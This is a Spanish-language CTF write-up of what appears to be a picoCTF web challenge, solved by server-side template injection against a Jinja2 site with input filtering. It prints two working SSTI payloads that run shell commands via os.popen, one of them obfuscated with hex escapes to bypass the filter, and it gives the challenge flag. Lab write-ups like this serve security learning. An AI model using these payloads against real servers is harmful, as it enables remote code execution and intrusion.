### Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
#### Una vez iniciada la instancia del desafío:
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:61430/)!
### Solución
Al hacer clic en el enlace proporcionado en la descripción una vez iniciada la instancia del reto, nos encontramos con un sitio semejante al del primer reto de este tipo:

![[Pasted image 20250412184231.png]]

Por lo que se intenta aplicar el mismo payload que nos dió resultado en el reto anterior:
`{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`

![[Pasted image 20250412184440.png]]

A diferencia del primer reto, como podemos ver en la imagen anterior no nos es posible utilizar el payload con el que se resolvió el otro reto, por lo que buscando en internet encontramos la manera de usar uno ofuscado, ya que con el anterior no podíamos acceder a **os** y demás cosas que si podíamos acceder con el otro payload.

Dicho payload ofuscado es el siguiente:
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`

Al ejecutarlo obtenemos la bandera que da solución a este reto:

```
picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}
```
### Notas Adicionales

### Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/